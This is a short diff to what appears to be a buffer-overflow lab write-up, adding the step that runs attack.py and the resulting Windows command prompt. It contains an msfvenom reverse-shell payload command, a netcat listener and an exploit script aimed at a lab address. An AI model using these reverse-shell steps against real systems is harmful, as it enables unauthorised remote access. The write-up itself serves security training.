@@ -607,7 +607,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -
 
 Now that we know what it is we need to exploit this machine, we can return to the previous exploit script and use it as `attack.py`:
 
-```
+```python3
 import socket
 
 ip = "10.10.208.35"
@@ -665,4 +665,14 @@ And after re-opening and re-running `oscp.exe`, start a `netcat` listener on hos
 
 ```
 nc -lvnp 9822
+python3 attack.py
+```
+
+And we get the shell:
+
+```
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\admin\Desktop\vulnerable-apps\oscp>
 ```
